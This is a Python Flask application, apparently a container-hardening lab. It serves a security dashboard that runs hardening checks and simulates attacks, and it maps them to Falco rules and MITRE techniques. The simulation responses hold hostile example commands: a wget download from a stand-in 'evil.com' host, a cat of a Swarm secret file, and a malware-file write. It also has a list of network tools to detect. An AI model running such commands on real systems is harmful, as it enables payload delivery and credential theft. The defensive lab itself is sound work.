"""SOC Dashboard — Container Hardening & Monitoring Lab."""

import os
import sys
import time
import signal
import logging
import subprocess
import datetime

from flask import Flask, render_template, jsonify

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%S%z",
)
logger = logging.getLogger("hardened-app")

app = Flask(__name__)

SECRETS_BASE_PATH = "/run/secrets"
REQUIRED_SECRET = "db_password"

security_events = []


def log_security_event(level: str, title: str, detail: str) -> dict:
    event = {
        "timestamp": datetime.datetime.now().strftime("%H:%M:%S"),
        "level": level,
        "title": title,
        "detail": detail,
    }
    security_events.append(event)
    if len(security_events) > 50:
        security_events.pop(0)
    return event


def read_secret(secret_name: str) -> str:
    secret_path = os.path.join(SECRETS_BASE_PATH, secret_name)

    try:
        with open(secret_path, "r", encoding="utf-8") as f:
            secret_value = f.read().strip()
    except FileNotFoundError:
        raise FileNotFoundError(
            f"Secret '{secret_name}' não encontrado em {secret_path}. "
            f"Verifique se o secret foi criado (`docker secret ls`) e se está "
            f"declarado na seção 'secrets' do stack.yml."
        )
    except PermissionError:
        raise PermissionError(
            f"Sem permissão para ler '{secret_path}'. "
            f"Verifique o UID/GID do usuário do container e as permissões do secret "
            f"(mode) no stack.yml."
        )
    except OSError as exc:
        raise RuntimeError(
            f"Erro inesperado ao ler secret '{secret_name}': {exc}"
        ) from exc

    if not secret_value:
        raise ValueError(
            f"Secret '{secret_name}' está vazio. Recrie com: "
            f"`echo '<valor>' | docker secret create {secret_name} -`"
        )

    return secret_value


def mask_secret(value: str) -> str:
    if len(value) > 4:
        return value[:2] + "*" * (len(value) - 4) + value[-2:]
    return "****"


def get_hardening_checks() -> list:
    checks = []

    # Check 1: Usuário não-root
    uid = os.getuid() if hasattr(os, "getuid") else -1
    checks.append({
        "name": "Usuário Não-Root",
        "description": "Container roda com UID > 10000, sem privilégios de admin",
        "status": "pass" if uid > 0 and uid != 0 else "fail",
        "detail": f"UID atual: {uid}",
        "icon": "user-shield",
    })

    # Check 2: Filesystem read-only
    fs_readonly = False
    try:
        test_path = "/app/_write_test"
        with open(test_path, "w") as f:
            f.write("test")
        os.remove(test_path)
    except (OSError, IOError):
        fs_readonly = True
    checks.append({
        "name": "Filesystem Read-Only",
        "description": "O disco do container é somente leitura — malware não consegue gravar",
        "status": "pass" if fs_readonly else "fail",
        "detail": "Filesystem protegido contra escrita" if fs_readonly else "ALERTA: Filesystem gravável",
        "icon": "hard-drive",
    })

    # Check 3: Secret via arquivo (não via ENV)
    secret_via_file = os.path.exists(os.path.join(SECRETS_BASE_PATH, REQUIRED_SECRET))
    env_has_password = any("password" in k.lower() or "secret" in k.lower() for k in os.environ)
    checks.append({
        "name": "Secrets via Arquivo (Swarm)",
        "description": "Credenciais montadas como arquivo read-only, não como variável de ambiente",
        "status": "pass" if secret_via_file and not env_has_password else ("warn" if not secret_via_file else "fail"),
        "detail": f"Arquivo: {SECRETS_BASE_PATH}/{REQUIRED_SECRET}" if secret_via_file else "Secret não encontrado (normal fora do Swarm)",
        "icon": "lock",
    })

    # Check 4: Sem shell de login
    has_bash = os.path.exists("/bin/bash")
    checks.append({
        "name": "Shell Restrito",
        "description": "Bash removido ou restrito — dificulta exploração interativa",
        "status": "pass" if not has_bash else "warn",
        "detail": "/bin/bash não encontrado" if not has_bash else "/bin/bash presente (mitigado por Falco)",
        "icon": "terminal",
    })

    # Check 5: Sem ferramentas de rede
    net_tools = ["/usr/bin/wget", "/usr/bin/curl", "/usr/bin/nc"]
    found_tools = [t for t in net_tools if os.path.exists(t)]
    checks.append({
        "name": "Ferramentas de Rede Removidas",
        "description": "wget, curl e netcat removidos — impede download de payloads maliciosos",
        "status": "pass" if not found_tools else "fail",
        "detail": "Nenhuma ferramenta de rede encontrada" if not found_tools else f"Encontrado: {', '.join(found_tools)}",
        "icon": "wifi-off",
    })

    # Check 6: PID do processo
    checks.append({
        "name": "Processo Isolado",
        "description": "Container tem seu próprio namespace de processos (PID isolation)",
        "status": "pass",
        "detail": f"PID: {os.getpid()} (dentro do namespace do container)",
        "icon": "box",
    })

    return checks


@app.route("/")
def dashboard():
    return render_template("index.html")


@app.route("/site")
def target_site():
    return render_template("site.html")


@app.route("/api/status")
def api_status():
    checks = get_hardening_checks()
    passed = sum(1 for c in checks if c["status"] == "pass")
    total = len(checks)

    secret_status = {"available": False, "masked": "N/A", "detail": ""}
    try:
        secret_val = read_secret(REQUIRED_SECRET)
        secret_status = {
            "available": True,
            "masked": mask_secret(secret_val),
            "detail": "Conexão com Banco de Dados simulada com sucesso.",
        }
        log_security_event("info", "Secret Lido", "Leitura autorizada do secret db_password pelo processo Python.")
    except Exception as exc:
        secret_status["detail"] = str(exc)
        log_security_event("warn", "Secret Indisponível", str(exc))

    return jsonify({
        "container": {
            "uid": os.getuid() if hasattr(os, "getuid") else "N/A",
            "pid": os.getpid(),
            "hostname": os.uname().nodename if hasattr(os, "uname") else "N/A",
            "python": sys.version.split()[0],
            "uptime": time.strftime("%H:%M:%S", time.gmtime(time.time() - APP_START_TIME)),
        },
        "hardening": {
            "checks": checks,
            "score": round((passed / total) * 100),
            "passed": passed,
            "total": total,
        },
        "secret": secret_status,
        "events": security_events[-20:],
    })


@app.route("/api/simulate/read-secret")
def simulate_read_secret():
    log_security_event(
        "critical",
        "Simulação: Leitura de Secret",
        "Tentativa de leitura via 'cat /run/secrets/db_password' — "
        "em ambiente real, Falco emitiria alerta CRITICAL (MITRE T1552.001)."
    )
    return jsonify({
        "attack": "cat /run/secrets/db_password",
        "blocked": True,
        "falco_rule": "Unauthorized Access to Swarm Secrets",
        "mitre": "T1552.001 — Credentials In Files",
        "severity": "CRITICAL",
        "detail": "Apenas o binário Python autorizado pode ler secrets. "
                  "Qualquer outro processo (cat, sh, bash) aciona alerta do Falco.",
    })


@app.route("/api/simulate/shell-spawn")
def simulate_shell_spawn():
    log_security_event(
        "warning",
        "Simulação: Shell Interativo",
        "Tentativa de abrir 'sh' dentro do container — "
        "Falco emitiria alerta WARNING (MITRE T1059)."
    )
    return jsonify({
        "attack": "docker exec <id> sh",
        "blocked": True,
        "falco_rule": "Shell Spawned in Hardened Container",
        "mitre": "T1059 — Command and Scripting Interpreter",
        "severity": "WARNING",
        "detail": "Shell interativo em container de produção é indicador de comprometimento. "
                  "Bash foi removido da imagem; /bin/sh restante é monitorado pelo Falco.",
    })


@app.route("/api/simulate/write-filesystem")
def simulate_write_fs():
    blocked = False
    error_msg = ""
    try:
        with open("/app/malware.sh", "w") as f:
            f.write("#!/bin/sh\necho pwned")
    except (OSError, IOError) as exc:
        blocked = True
        error_msg = str(exc)

    level = "info" if blocked else "critical"
    log_security_event(
        level,
        "Simulação: Escrita no Filesystem",
        f"Tentativa de criar /app/malware.sh — {'BLOQUEADO pelo read-only fs' if blocked else 'ALERTA: escrita permitida!'}"
    )
    return jsonify({
        "attack": "echo 'malware' > /app/malware.sh",
        "blocked": blocked,
        "falco_rule": "Write below monitored dir",
        "mitre": "T1105 — Ingress Tool Transfer",
        "severity": "CRITICAL" if not blocked else "INFO (Bloqueado)",
        "detail": f"Read-only filesystem impediu a escrita: {error_msg}" if blocked else "ALERTA: Filesystem não está read-only!",
    })


@app.route("/api/simulate/network-tool")
def simulate_network_tool():
    tools_found = []
    for tool in ["wget", "curl", "nc", "ncat"]:
        try:
            result = subprocess.run(
                ["which", tool], capture_output=True, timeout=2
            )
            if result.returncode == 0:
                tools_found.append(tool)
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

    blocked = len(tools_found) == 0
    log_security_event(
        "info" if blocked else "critical",
        "Simulação: Ferramentas de Rede",
        f"Busca por wget/curl/nc — {'Nenhuma encontrada (REMOVIDAS)' if blocked else f'ENCONTRADAS: {tools_found}'}"
    )
    return jsonify({
        "attack": "wget http://evil.com/payload -O /tmp/payload",
        "blocked": blocked,
        "falco_rule": "Launch Suspicious Network Tool in Container",
        "mitre": "T1105 — Ingress Tool Transfer",
        "severity": "INFO (Bloqueado)" if blocked else "CRITICAL",
        "detail": "Ferramentas de rede (wget, curl, nc) foram removidas no Dockerfile. "
                  "Atacante não consegue baixar payloads adicionais."
                  if blocked else f"ALERTA: Ferramentas encontradas: {tools_found}",
    })


@app.route("/api/events")
def api_events():
    return jsonify({"events": security_events[-20:]})


@app.route("/healthz")
def healthz():
    return jsonify({"status": "healthy", "pid": os.getpid()}), 200


APP_START_TIME = time.time()


def _handle_sigterm(signum, frame):
    logger.info("SIGTERM recebido — iniciando shutdown gracioso.")
    sys.exit(0)


signal.signal(signal.SIGTERM, _handle_sigterm)


if __name__ == "__main__":
    logger.info("=== Hardened Container Lab — Dashboard Iniciando ===")
    logger.info("UID: %s | PID: %s", os.getuid() if hasattr(os, "getuid") else "N/A", os.getpid())

    try:
        secret = read_secret(REQUIRED_SECRET)
        logger.info("Secret '%s' lido com sucesso (mascarado: %s)", REQUIRED_SECRET, mask_secret(secret))
        log_security_event("info", "Inicialização", "Secret db_password lido com sucesso. Conexão com DB simulada.")
    except Exception as exc:
        logger.warning("Secret não disponível na inicialização: %s", exc)
        log_security_event("warn", "Inicialização", f"Secret não disponível: {exc}")

    log_security_event("info", "Dashboard Online", "Painel de segurança iniciado na porta 5000.")

    app.run(host="0.0.0.0", port=5000, debug=False)
